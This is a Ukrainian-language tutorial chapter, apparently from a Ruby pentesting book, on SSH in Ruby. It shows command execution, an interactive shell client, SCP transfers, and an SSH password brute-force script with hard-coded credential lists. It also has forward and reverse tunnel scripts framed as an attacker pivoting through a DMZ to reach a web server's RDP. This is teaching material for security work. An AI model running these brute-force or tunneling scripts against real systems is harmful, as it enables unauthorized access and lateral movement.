# SSH
Тут ми покажемо як працювати з SSH в Рубі. Для цього нам треб буде встановити гем net-ssh.

- Встановлення net-ssh
```
gem install net-ssh
```

## Простий запуск команди в SSH
Далі йде дуже простий SSH клієнт який відправляє і запускає команди на віддаленій системі:

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

@hostname = "localhost"
@username = "root"
@password = "password"
@cmd = ARGV[0]

begin
  ssh = Net::SSH.start(@hostname, @username, :password => @password)
  res = ssh.exec!(@cmd)
  ssh.close
  puts res
rescue
  puts "Unable to connect to #{@hostname} using #{@username}/#{@password}"
end
```

## SSH Клієнт з шелом PTY

Наступний код - простий SSH клієнт який yfдає нам интерактивний шел PTY

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

@hostname = "localhost"
@username = "root"
@password = "password"

Net::SSH.start(@hostname, @username, :password => @password, :auth_methods => ["password"]) do |session|

  # Відкриваємо канал SSH  
  session.open_channel do |channel|
    
    # Запитуємо pseudo-tty (or "pty") для інтерактивних програм(наприклад vim, sudo, etc)
    channel.request_pty do |ch, success| 
      raise "Error requesting pty" unless success 

      # Запитуємо тип каналу шелу
      ch.send_channel_request("shell") do |ch, success| 
        raise "Error opening shell" unless success
    	STDOUT.puts "[+] Getting Remote Shell\n\n" if success
      end
    end

    # Виводимо STDERRвіддаленого сервера на наш STDOUT
    channel.on_extended_data do |ch, type, data|
      STDOUT.puts "Error: #{data}\n"
    end

    # Коли пакети отримано
    channel.on_data do |ch, data|
      STDOUT.print data
      cmd = gets
      channel.send_data( "#{cmd}" ) 
      trap("INT") {STDOUT.puts "Use 'exit' or 'logout' command to exit the session"}
    end
    
    channel.on_eof do |ch|
      puts "Exiting SSH Session.."
    end
    
    session.loop
  end
end
```

## Бруто-форс SSH 

**ssh-bf.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'net/ssh'

def attack_ssh(host, user, password, port=22, timeout = 5)
  begin
    Net::SSH.start(host, user, :password => password, 
        		   :auth_methods => ["password"], :port => port, 
        		   :paranoid => false, :non_interactive => true, :timeout => timeout ) do |session|
      puts "Password Found: " + "#{host} | #{user}:#{password}" 
    end

  rescue Net::SSH::ConnectionTimeout
    puts "[!] The host '#{host}' not alive!"
  rescue Net::SSH::Timeout
    puts "[!] The host '#{host}' disconnected/timeouted unexpectedly!"
  rescue Errno::ECONNREFUSED
    puts "[!] Incorrect port #{port} for #{host}"
  rescue Net::SSH::AuthenticationFailed
    puts "Wrong Password: #{host} | #{user}:#{password}" 
  rescue Net::SSH::Authentication::DisallowedMethod
    puts "[!] The host '#{host}' doesn't accept password authentication method."
  end
end


hosts = ['192.168.0.1', '192.168.0.4', '192.168.0.50']
users = ['root', 'admin', 'rubyfu']
passs = ['admin1234', 'P@ssw0rd', '123456', 'AdminAdmin', 'secret', coffee]

hosts.each do |host|
  users.each do |user|     
    passs.each do |password|
      
      attack_ssh host, user, password
  
end end end
```

## Тунелювання SSH

### Перенаправлення SSH тунелю

```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| ----SSH Tunnel---> | |SSH Server| <-RDP-> |Web server| |
                              |                 |                 |
                              |-----------------|-----------------|
```

Запустіть ssh-ftunnel.rb на **SSH Сервері** 

**ssh-ftunnel.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|

  ssh.forward.local('0.0.0.0', 3333, "WebServer", 3389)

  puts "[+] Starting SSH forward tunnel"
  ssh.loop { true }
end
```
Тепер підключіться до **SSH Серверу** на порту 3333 з допомогою вашого RDP клієнту. Ви побачите інтерфейс RDP логіну на **Вебсервері(WebServer)**

```
rdesktop WebServer:3333
```


### Зворотній SSH тунель 
```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| <---SSH Tunnel---- | |SSH Server| <-RDP-> |Web server| |
  |   |                       |                 |                 |
  `->-'                       |-----------------|-----------------|
```
Запустіть ssh-rtunnel.rb на **SSH Сервері** 

**ssh-rtunnel.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|

  ssh.forward.remote_to(3389, 'WebServer', 3333, '0.0.0.0')
  
  puts "[+] Starting SSH reverse tunnel"
  ssh.loop { true }
end
```
Тепер підключаєиося по SSH з **SSH Серверу** до **локальної машини(localhost)** на порту SSH локальної машини і далі підключаємося з вашого локального хоста до нього ж на порту 3333 за допомогою вашого RDP клієнту. Ви побачите інтерфейс RDP логіну на **Вебсервері(WebServer)**

```
rdesktop localhost:3333
```



## Копіювання файлів через SSH (SCP)

- Встановлення гему scp
```
gem install net-scp
```

- Завантаження файлу

```ruby
require 'net/scp'

Net::SCP.upload!(
    		        "SSHServer", 
                    "root",
                    "/rubyfu/file.txt", "/root/", 
                    #:recursive => true,    # Розкоментуйте для рекурсивної передачі
                    :ssh => { :password => "123123" }
                )
```

- Вивантаження файлу з сервера

```ruby
require 'net/scp'

Net::SCP.download!(
    		        "SSHServer", 
                    "root",
                    "/root/", "/rubyfu/file.txt",
                    #:recursive => true,   # Розкоментуйте для рекурсивної передачі
                    :ssh => { :password => "123123" }
                  )
```




<br><br><br>
---
- [More SSH examples](http://ruby.about.com/sitesearch.htm?q=ruby+ssh&boost=3&SUName=ruby)
- [Capistranorb.com](http://capistranorb.com/)
- [Net:SSH old docs with example](http://net-ssh.github.io/ssh/v1/chapter-6.html)



